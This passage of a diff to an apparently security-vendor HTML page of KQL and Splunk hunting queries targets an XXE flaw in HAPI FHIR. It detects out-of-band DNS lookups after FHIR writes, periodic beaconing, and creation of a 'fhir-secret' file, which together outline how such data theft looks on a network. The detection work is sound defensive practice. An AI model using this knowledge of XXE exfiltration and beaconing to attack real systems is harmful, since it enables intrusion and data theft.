+| NOT DomainName=/(\.hl7\.org|\.loinc\.org|snomed\.org|\.microsoft\.com|\.azure\.com|\.maven\.org|\.local|\.internal)$/i
+| join({#event_simpleName=ProcessRollup2 CommandLine=/(hapi-fhir|org\.hl7\.fhir|ca\.uhn\.hapi|XsltUtilities)/i | groupBy([aid], function=count())}, field=aid)
+| groupBy([aid, ComputerName, DomainName], function=count(as=Queries))
+| Queries&lt;5</code></pre></div>
+    <div class="tab-content" id="art-07-uc4-spl"><span class="splunk-cat-pill splunk-cat-network" title="Splunk-research detection category">NETWORK</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-07-uc4-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-07-uc4-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-07-uc4-spl-acc"><button class="copy-btn">COPY</button><code>| tstats summariesonly=t min(_time) as PostTime from datamodel=Web.Web where (Web.url=&quot;*/fhir/*&quot; OR Web.url=&quot;*/baseDstu*&quot; OR Web.url=&quot;*/baseR4/*&quot; OR Web.url=&quot;*/baseR5/*&quot; OR Web.url=&quot;*/hl7/fhir/*&quot;) Web.http_method IN (&quot;POST&quot;,&quot;PUT&quot;) by Web.dest Web.src
+| `drop_dm_object_name(Web)`
+| rename dest as fhir_host src as client_ip
+| join type=inner fhir_host [| tstats summariesonly=t min(_time) as DnsTime values(All_Traffic.dest) as resolved_domain from datamodel=Network_Traffic.All_Traffic where All_Traffic.app IN (&quot;java&quot;,&quot;javaw&quot;) All_Traffic.transport=&quot;udp&quot; All_Traffic.dest_port=53 All_Traffic.dest_category=&quot;external&quot; by All_Traffic.src All_Traffic.query | `drop_dm_object_name(All_Traffic)` | rename src as fhir_host query as domain]
+| eval delta_sec = DnsTime - PostTime
+| where delta_sec &gt;= 0 AND delta_sec &lt;= 10
+| join type=left domain [| tstats summariesonly=t earliest(_time) as first_seen from datamodel=Network_Traffic.All_Traffic where All_Traffic.dest_port=53 by All_Traffic.query | rename All_Traffic.query as domain]
+| where first_seen &gt; relative_time(now(), &quot;-30d&quot;) OR isnull(first_seen)
+| table PostTime DnsTime delta_sec fhir_host client_ip domain</code></pre><pre class="spl-mode-body" id="art-07-uc4-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false min(_time) as PostTime from datamodel=Web.Web where (Web.url=&quot;*/fhir/*&quot; OR Web.url=&quot;*/baseDstu*&quot; OR Web.url=&quot;*/baseR4/*&quot; OR Web.url=&quot;*/baseR5/*&quot; OR Web.url=&quot;*/hl7/fhir/*&quot;) Web.http_method IN (&quot;POST&quot;,&quot;PUT&quot;) by Web.dest Web.src
+| `drop_dm_object_name(Web)`
+| rename dest as fhir_host src as client_ip
+| join type=inner fhir_host [| tstats summariesonly=false min(_time) as DnsTime values(All_Traffic.dest) as resolved_domain from datamodel=Network_Traffic.All_Traffic where All_Traffic.app IN (&quot;java&quot;,&quot;javaw&quot;) All_Traffic.transport=&quot;udp&quot; All_Traffic.dest_port=53 All_Traffic.dest_category=&quot;external&quot; by All_Traffic.src All_Traffic.query | `drop_dm_object_name(All_Traffic)` | rename src as fhir_host query as domain]
+| eval delta_sec = DnsTime - PostTime
+| where delta_sec &gt;= 0 AND delta_sec &lt;= 10
+| join type=left domain [| tstats summariesonly=false earliest(_time) as first_seen from datamodel=Network_Traffic.All_Traffic where All_Traffic.dest_port=53 by All_Traffic.query | rename All_Traffic.query as domain]
+| where first_seen &gt; relative_time(now(), &quot;-30d&quot;) OR isnull(first_seen)
+| table PostTime DnsTime delta_sec fhir_host client_ip domain</code></pre></div></div>
   </div>
 </details>
 <details class="uc" data-uc-slug="0bf69215de" data-platforms="def,sent,spl" data-targets="windows">
@@ -3235,11 +3335,11 @@ fields @timestamp, @logStream, @message
     <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Network_Traffic.All_Traffic</span> <span class="ind">DeviceNetworkEvents</span></div>
     
     <div class="tabs">
-      <button class="tab-btn active" data-target="art-07-uc4-kql">Defender KQL</button>
-      <button class="tab-btn" data-target="art-07-uc4-sentinel">Sentinel KQL</button>
-      <button class="tab-btn" data-target="art-07-uc4-spl">Splunk SPL (CIM)</button>
+      <button class="tab-btn active" data-target="art-07-uc5-kql">Defender KQL</button>
+      <button class="tab-btn" data-target="art-07-uc5-sentinel">Sentinel KQL</button>
+      <button class="tab-btn" data-target="art-07-uc5-spl">Splunk SPL (CIM)</button>
     </div>
-    <div class="tab-content active" id="art-07-uc4-kql"><pre><button class="copy-btn">COPY</button><code>DeviceNetworkEvents
+    <div class="tab-content active" id="art-07-uc5-kql"><pre><button class="copy-btn">COPY</button><code>DeviceNetworkEvents
 | where Timestamp &gt; ago(1d)
 | where RemoteIPType == &quot;Public&quot; and ActionType == &quot;ConnectionSuccess&quot;
 | project DeviceName, RemoteIP, RemotePort, Timestamp
@@ -3252,7 +3352,7 @@ fields @timestamp, @logStream, @message
     by DeviceName, RemoteIP, RemotePort
 | where conn_count &gt; 30 and avg_delta between (30.0 .. 600.0) and stdev_delta &lt; 5.0
 | order by conn_count desc</code></pre></div>
-    <div class="tab-content" id="art-07-uc4-sentinel"><pre><button class="copy-btn">COPY</button><code>ImNetworkSession
+    <div class="tab-content" id="art-07-uc5-sentinel"><pre><button class="copy-btn">COPY</button><code>ImNetworkSession
 | where TimeGenerated &gt; ago(2h)
 | where DvcAction != &quot;Block&quot;
 | where ipv4_is_private(DstIpAddr) == false
@@ -3262,7 +3362,7 @@ fields @timestamp, @logStream, @message
 | where ConnCount &gt; 50 and DistinctMinutes &gt; 30   // sustained, not bursty
 | order by ConnCount desc
 </code></pre></div>
-    <div class="tab-content" id="art-07-uc4-spl"><span class="splunk-cat-pill splunk-cat-network" title="Splunk-research detection category">NETWORK</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-07-uc4-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-07-uc4-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-07-uc4-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
+    <div class="tab-content" id="art-07-uc5-spl"><span class="splunk-cat-pill splunk-cat-network" title="Splunk-research detection category">NETWORK</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-07-uc5-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-07-uc5-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-07-uc5-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
     from datamodel=Network_Traffic.All_Traffic
     where All_Traffic.action=&quot;allowed&quot; AND All_Traffic.dest_category!=&quot;internal&quot;
     by _time span=10s, All_Traffic.src, All_Traffic.dest
@@ -3271,7 +3371,7 @@ fields @timestamp, @logStream, @message
 | eval delta = _time - prev_time
 | stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
 | where count &gt; 30 AND sd_delta &lt; 5 AND avg_delta&gt;=30 AND avg_delta&lt;=600
-| sort - count</code></pre><pre class="spl-mode-body" id="art-07-uc4-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count, values(All_Traffic.dest_port) AS ports
+| sort - count</code></pre><pre class="spl-mode-body" id="art-07-uc5-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count, values(All_Traffic.dest_port) AS ports
     from datamodel=Network_Traffic.All_Traffic
     where All_Traffic.action=&quot;allowed&quot; AND All_Traffic.dest_category!=&quot;internal&quot;
     by _time span=10s, All_Traffic.src, All_Traffic.dest
@@ -3298,11 +3398,11 @@ fields @timestamp, @logStream, @message
     <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Vulnerabilities</span> <span class="ind">DeviceInfo</span> <span class="ind">DeviceTvmSoftwareVulnerabilities</span></div>
     
     <div class="tabs">
-      <button class="tab-btn active" data-target="art-07-uc5-kql">Defender KQL</button>
-      <button class="tab-btn" data-target="art-07-uc5-sentinel">Sentinel KQL</button>
-      <button class="tab-btn" data-target="art-07-uc5-spl">Splunk SPL (CIM)</button>
+      <button class="tab-btn active" data-target="art-07-uc6-kql">Defender KQL</button>
+      <button class="tab-btn" data-target="art-07-uc6-sentinel">Sentinel KQL</button>
+      <button class="tab-btn" data-target="art-07-uc6-spl">Splunk SPL (CIM)</button>
     </div>
-    <div class="tab-content active" id="art-07-uc5-kql"><pre><button class="copy-btn">COPY</button><code>// TVM tables are daily snapshots — pin a 1-day window so the engine
+    <div class="tab-content active" id="art-07-uc6-kql"><pre><button class="copy-btn">COPY</button><code>// TVM tables are daily snapshots — pin a 1-day window so the engine
 // partitions on Timestamp instead of scanning the full retention.
 DeviceTvmSoftwareVulnerabilities
 | where Timestamp &gt; ago(1d)
@@ -3311,7 +3411,7 @@ DeviceTvmSoftwareVulnerabilities
 | project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
 | order by VulnerabilitySeverityLevel asc, DeviceName asc
 </code></pre></div>
-    <div class="tab-content" id="art-07-uc5-sentinel"><pre><button class="copy-btn">COPY</button><code>// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
+    <div class="tab-content" id="art-07-uc6-sentinel"><pre><button class="copy-btn">COPY</button><code>// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
 // `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
 // no Sentinel translation — track via Update / Heartbeat OS-version
 // gaps as a coarse approximation.
@@ -3323,12 +3423,12 @@ DeviceTvmSoftwareVulnerabilities
           VulnerabilitySeverityLevel, RecommendedSecurityUpdate
 | order by VulnerabilitySeverityLevel asc, DeviceName asc
 </code></pre></div>
-    <div class="tab-content" id="art-07-uc5-spl"><span class="splunk-cat-pill splunk-cat-application" title="Splunk-research detection category">APPLICATION</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-07-uc5-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-07-uc5-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-07-uc5-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
+    <div class="tab-content" id="art-07-uc6-spl"><span class="splunk-cat-pill splunk-cat-application" title="Splunk-research detection category">APPLICATION</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-07-uc6-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-07-uc6-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-07-uc6-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
     from datamodel=Vulnerabilities
     where Vulnerabilities.signature IN (&quot;CVE-2026-55471&quot;)
     by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
 | `drop_dm_object_name(Vulnerabilities)`
-| sort - severity</code></pre><pre class="spl-mode-body" id="art-07-uc5-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
+| sort - severity</code></pre><pre class="spl-mode-body" id="art-07-uc6-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
     from datamodel=Vulnerabilities
     where Vulnerabilities.signature IN (&quot;CVE-2026-55471&quot;)
     by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
@@ -3351,11 +3451,11 @@ DeviceTvmSoftwareVulnerabilities
     <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Endpoint.Processes</span> <span class="ind">Endpoint.Filesystem</span> <span class="ind">Endpoint.Registry</span></div>
     
     <div class="tabs">
-      <button class="tab-btn active" data-target="art-07-uc6-kql">Defender KQL</button>
-      <button class="tab-btn" data-target="art-07-uc6-sentinel">Sentinel KQL</button>
-      <button class="tab-btn" data-target="art-07-uc6-spl">Splunk SPL (CIM)</button>
+      <button class="tab-btn active" data-target="art-07-uc7-kql">Defender KQL</button>
+      <button class="tab-btn" data-target="art-07-uc7-sentinel">Sentinel KQL</button>
+      <button class="tab-btn" data-target="art-07-uc7-spl">Splunk SPL (CIM)</button>
     </div>
-    <div class="tab-content active" id="art-07-uc6-kql"><pre><button class="copy-btn">COPY</button><code>// Article-specific bespoke detection — [GHSA / CRITICAL] CVE-2026-55471: HAPI FHIR: XXE in XsltUtilities.saxonTransform
+    <div class="tab-content active" id="art-07-uc7-kql"><pre><button class="copy-btn">COPY</button><code>// Article-specific bespoke detection — [GHSA / CRITICAL] CVE-2026-55471: HAPI FHIR: XXE in XsltUtilities.saxonTransform
 // Hunts the actual binaries / paths / commandline fragments named
 // in the article instead of a generic technique-class template.
 
@@ -3368,7 +3468,7 @@ DeviceFileEvents
           FileName, ActionType, InitiatingProcessFileName,
           InitiatingProcessCommandLine
 | order by Timestamp desc</code></pre></div>
-    <div class="tab-content" id="art-07-uc6-sentinel"><pre><button class="copy-btn">COPY</button><code>// Microsoft Sentinel — auto-derived from the Defender XDR hunt.
+    <div class="tab-content" id="art-07-uc7-sentinel"><pre><button class="copy-btn">COPY</button><code>// Microsoft Sentinel — auto-derived from the Defender XDR hunt.
 // Requires the Microsoft 365 Defender data connector (streams the
 // advanced-hunting tables into Sentinel; Timestamp → TimeGenerated).
 // Article-specific bespoke detection — [GHSA / CRITICAL] CVE-2026-55471: HAPI FHIR: XXE in XsltUtilities.saxonTransform
@@ -3384,14 +3484,14 @@ DeviceFileEvents
           FileName, ActionType, InitiatingProcessFileName,
           InitiatingProcessCommandLine
 | order by TimeGenerated desc</code></pre></div>
-    <div class="tab-content" id="art-07-uc6-spl"><span class="splunk-cat-pill splunk-cat-endpoint" title="Splunk-research detection category">ENDPOINT</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-07-uc6-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-07-uc6-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-07-uc6-spl-acc"><button class="copy-btn">COPY</button><code>``` Article-specific bespoke detection — [GHSA / CRITICAL] CVE-2026-55471: HAPI FHIR: XXE in XsltUtilities.saxonTransform ```
+    <div class="tab-content" id="art-07-uc7-spl"><span class="splunk-cat-pill splunk-cat-endpoint" title="Splunk-research detection category">ENDPOINT</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-07-uc7-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-07-uc7-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-07-uc7-spl-acc"><button class="copy-btn">COPY</button><code>``` Article-specific bespoke detection — [GHSA / CRITICAL] CVE-2026-55471: HAPI FHIR: XXE in XsltUtilities.saxonTransform ```
 | tstats `summariesonly` count
     from datamodel=Endpoint.Filesystem
     where Filesystem.action IN (&quot;created&quot;,&quot;modified&quot;)
       AND (Filesystem.file_path=&quot;*/var/folders/.../fhir-secret-467000002121832365.txt*&quot;)
     by Filesystem.dest, Filesystem.user, Filesystem.process_name,
        Filesystem.file_path, Filesystem.file_name
-| `drop_dm_object_name(Filesystem)`</code></pre><pre class="spl-mode-body" id="art-07-uc6-spl-raw"><button class="copy-btn">COPY</button><code>``` Article-specific bespoke detection — [GHSA / CRITICAL] CVE-2026-55471: HAPI FHIR: XXE in XsltUtilities.saxonTransform ```
+| `drop_dm_object_name(Filesystem)`</code></pre><pre class="spl-mode-body" id="art-07-uc7-spl-raw"><button class="copy-btn">COPY</button><code>``` Article-specific bespoke detection — [GHSA / CRITICAL] CVE-2026-55471: HAPI FHIR: XXE in XsltUtilities.saxonTransform ```
 | tstats summariesonly=false count
     from datamodel=Endpoint.Filesystem
     where Filesystem.action IN (&quot;created&quot;,&quot;modified&quot;)
